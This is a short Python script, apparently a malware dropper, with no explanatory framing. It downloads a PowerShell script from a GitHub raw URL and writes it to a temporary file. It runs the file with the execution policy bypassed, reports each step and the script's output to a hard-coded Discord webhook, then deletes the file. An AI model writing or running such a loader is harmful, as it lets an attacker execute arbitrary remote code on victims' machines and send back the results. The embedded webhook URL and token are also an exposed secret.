import subprocess
import tempfile
import os
os.system('py -m pip install requests')
os.system('python -m pip install requests')
os.system('pip install requests')
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'
SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.ps1'

def send_discord_notification(message, color=0x00FF00):
    try:
        requests.post(WEBHOOK_URL, json={'embeds': [{'description': message, 'color': color}]})
    except:
        pass
send_discord_notification("inited")
try:
    send_discord_notification("getting script")
    script_content = requests.get(SCRIPT_URL, verify=False).content
    send_discord_notification("got script")
except:
    send_discord_notification('Failed to download script', 0xFF0000)
    exit(1)


send_discord_notification("getting a temp file")
with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1') as temp_file:
    temp_file.write(script_content)
    temp_file_path = temp_file.name

try:
    send_discord_notification("trying to run")
    result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', temp_file_path], capture_output=True, text=True)
    if result.returncode == 0:
        send_discord_notification('Script executed successfully\n' + result.stdout, 0x00FF00)
    else:
        send_discord_notification('Script failed\n' + result.stderr, 0xFF0000)
except Exception as e:
    send_discord_notification(f"error running {e}")
finally:
    os.unlink(temp_file_path)
    send_discord_notification("unlinked")
